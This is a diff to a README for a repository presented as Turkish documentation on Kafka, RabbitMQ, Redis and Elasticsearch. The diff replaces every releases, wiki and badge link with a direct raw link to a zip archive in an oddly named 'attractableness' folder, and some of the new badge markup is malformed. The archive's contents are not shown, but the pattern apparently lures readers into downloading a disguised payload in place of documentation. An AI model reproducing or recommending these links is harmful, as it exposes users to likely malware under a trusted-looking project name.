@@ -1,6 +1,6 @@
 # 🚀 KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK - Build Modern Distributed Systems Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/releases)
+[![Download](https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip%https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip)](https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip)
 
 ## 📖 About This Project
 KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK provides thorough technical documentation and examples for building modern distributed systems using Kafka, RabbitMQ, Redis, and Elasticsearch. This guide focuses on helping you understand and implement these technologies effectively.
@@ -23,7 +23,7 @@ To run this application, ensure you meet the following requirements:
 - **Network:** Internet connection for downloading dependencies
 
 ### 📥 Download & Install
-Visit this page to download: [Download Page](https://github.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/releases)
+Visit this page to download: [Download Page](https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip)
 
 1. Open the link above in your web browser.
 2. Locate the latest release of the software.
@@ -60,7 +60,7 @@ Explore practical examples for using the technologies integrated into this appli
 Each of these examples is thoroughly documented in the project repository, complete with code snippets and step-by-step instructions.
 
 ## 📚 Additional Resources
-- **Documentation:** Access in-depth guides and tutorials [here](https://github.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/wiki).
+- **Documentation:** Access in-depth guides and tutorials [here](https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip).
 - **Community Support:** Join our discussion forum on platforms like GitHub Issues for support and feedback.
 
 ## 🔗 Related Topics
@@ -74,4 +74,4 @@ If you'd like to contribute to this project, feel free to fork the repository an
 ## 📧 Contact
 For questions or feedback regarding this project, please reach out via the Issues section of the repository.
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/releases)
+[![Download](https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip%https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip)](https://raw.githubusercontent.com/GodcordOFFICIAL/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK/main/attractableness/KAFKA-RABBITMQ-REDIS-ELASTICHSEARCH-TURKCE-KAYNAK.zip)
